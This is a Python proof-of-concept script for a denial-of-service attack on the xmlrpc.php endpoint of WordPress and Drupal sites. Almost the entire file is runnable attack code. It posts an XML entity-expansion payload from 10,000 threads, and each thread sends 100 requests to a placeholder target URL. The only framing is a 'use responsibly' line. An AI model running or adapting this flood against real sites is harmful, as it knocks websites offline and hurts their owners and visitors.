#!/usr/bin/env python3
#################################################################################
# CVE-Unknown Wordpress and Drupal XML Blowup Attack DoS
# Author: Nahid 
# This is a Proof of Concept Exploit, Please use responsibly.
#################################################################################

import threading
import time
import urllib.request

# Define the XML data as bytes
data = b"""<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE lolz [
 <!ENTITY poc "aaaaaaaaaaaaa">
]>
<methodCall>
  <methodName>aaa&poc;</methodName>
  <params>
   <param><value>aa</value></param>
   <param><value>aa</value></param>
  </params>
</methodCall>"""

req = urllib.request.Request('https://example.com/xmlrpc.php', data=data)
req.add_header('Accept', '*/*')
req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
req.add_header('Connection', '')
req.add_header('Content-type', 'text/xml')


class MyThread(threading.Thread):
    def run(self):
        print("{} started!".format(self.getName()))
        for _ in range(100):
            response = urllib.request.urlopen(req)
        time.sleep(0.2)
        print("{} finished!".format(self.getName()))


if __name__ == '__main__':
    for x in range(10000):
        thread = MyThread(name="Thread-{}".format(x + 1))
        thread.start()
        time.sleep(0.1)
